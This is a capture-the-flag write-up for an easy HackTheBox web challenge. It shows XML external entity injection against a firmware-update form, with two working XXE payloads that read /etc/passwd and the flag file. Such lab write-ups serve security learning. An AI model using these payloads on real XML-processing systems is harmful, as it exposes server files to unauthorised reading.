# HTB - CTF-Try-Out Event- Jailbreak - Web exploitation Write-up
**Author:** Mohammed Ali  
**Team:** CyberScope  
**Platform:** HackTheBox 
**Category:** WEB  
**Difficulty:** easy

<img width="336" height="375" alt="image" src="https://github.com/user-attachments/assets/c722b166-c884-4c4e-a659-5db2085a022a" />

## Description

* The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port? The flag is located in /flag.txt

## Skills Required
* Understanding of HTTP request handling.
* Familiarity with XML documents structure.

## Skills Learned
* Performing XML external entity (XXE) injection.
* 
## Application overview

<img width="1916" height="942" alt="image" src="https://github.com/user-attachments/assets/d3d34631-ec8f-4150-a1b4-052fe6cab159" />

When we visit the site we're greeted with an application handling firmware updates. This application accepts XML data over POST requests and processes them to initiate supposed firmware updates on a satellite system. 

Looking at the sample XML document, we can deduce that the extracted `Version` value from the XML input is used to construct a response message, so as the name of the challenge suggest let's use some common XXE payloads using the XML structure provided.

<img width="1388" height="812" alt="version" src="https://github.com/user-attachments/assets/0f0dbd45-ba20-41d0-b38a-21a5bc65db32" />
So lets create payload to exploit xxe 

```xml
<?xml version="1.0"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
</FirmwareUpdateConfig>
```
<img width="1690" height="942" alt="image" src="https://github.com/user-attachments/assets/725751e0-2ec4-4437-ab67-5a81705336cf" />

to read Flag 

```xml
<?xml version="1.0"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
</FirmwareUpdateConfig>
```
<img width="1917" height="942" alt="image" src="https://github.com/user-attachments/assets/4581624a-a9c2-43f3-bd93-da7108a78f34" />
Have a good day 
### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon
